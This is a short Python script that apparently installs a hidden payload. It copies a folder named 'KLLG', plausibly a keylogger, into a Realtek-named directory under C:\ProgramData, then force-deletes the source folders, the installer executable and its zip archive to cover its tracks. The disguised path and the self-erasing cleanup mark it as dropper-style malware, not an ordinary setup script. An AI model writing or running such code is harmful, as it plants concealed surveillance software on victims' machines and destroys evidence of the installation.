import os 

os.system("startup.cmd")
os.system("rmdir /s /q C:\ProgramData\Realtek\ANTB")
os.system("mkdir C:\ProgramData\Realtek\ANTB")
os.system("xcopy KLLG C:\ProgramData\Realtek\ANTB /e")
print("All files has been copied to the right destination")
os.system("PAUSE")
os.system("rmdir /s /q KLLG")
os.system("rmdir /s /q startup")
os.system("rmdir /s /q computers")
os.system("del /f startup.cmd")
os.system("del /f ../ANTBURGERV2.zip")
os.system("del /f install.exe")